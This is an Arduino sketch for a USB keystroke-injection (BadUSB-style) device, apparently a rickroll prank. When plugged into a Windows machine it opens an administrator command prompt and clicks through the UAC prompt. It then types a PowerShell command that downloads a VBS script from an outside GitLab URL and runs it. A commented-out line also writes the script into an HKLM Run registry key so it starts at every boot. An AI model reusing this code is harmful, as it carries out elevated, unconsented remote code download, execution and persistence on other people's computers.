/**
 *  Author: Sam van der Kris
 *  GitLab: https://gitlab.com/WarKitteh/arduino-hid-rickroll
 */

#include "Keyboard.h"

void typeKey(int key) {
	Keyboard.press(key);
	delay(50);
	Keyboard.release(key);
}

void runPayload() {
	Keyboard.begin();
	// Give Windows some time to recognize the Arduino as a human interface device
	delay(1000);

	// Open CMD
	Keyboard.press(KEY_LEFT_GUI);
	Keyboard.press('x');
	Keyboard.releaseAll();
	delay(200);
	// Press the UP key 8 times
	for (int i = 0; i < 8; i++) {
		typeKey(KEY_UP_ARROW);
	}
	delay(200);
	typeKey(KEY_RETURN);
	delay(500);
	// Bypass UAC prompt
	Keyboard.press(KEY_LEFT_ALT);
	Keyboard.press('y');
	delay(100);
	Keyboard.releaseAll();

	delay(200);

	// Download and run rickroll.vbs and exit when done
	Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && exit");
	//Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile('https://gitlab.com/WarKitteh/arduino-hid-rickroll/raw/cee63bb220c856587462b29d61bdfc70c806805f/rickroll.vbs','%userprofile%\\rickroll.vbs'); && start %userprofile%\\rickroll.vbs && reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v TotallyNotShadyStartupItem /d %userprofile%\\rickroll.vbs && exit");
	delay(100);
	typeKey(KEY_RETURN);

	Keyboard.end();
}

void setup() {
	// Uncomment this if you DON'T use a button on your Arduino
	//runPayload();
}

void loop() {
	// Uncomment this if you DO use a button on your Arduino (button has to be between pin 3 and ground)
	/*pinMode(3, INPUT_PULLUP);
	if (digitalRead(3) == LOW) {
		runPayload();
		delay(500);
	}*/
}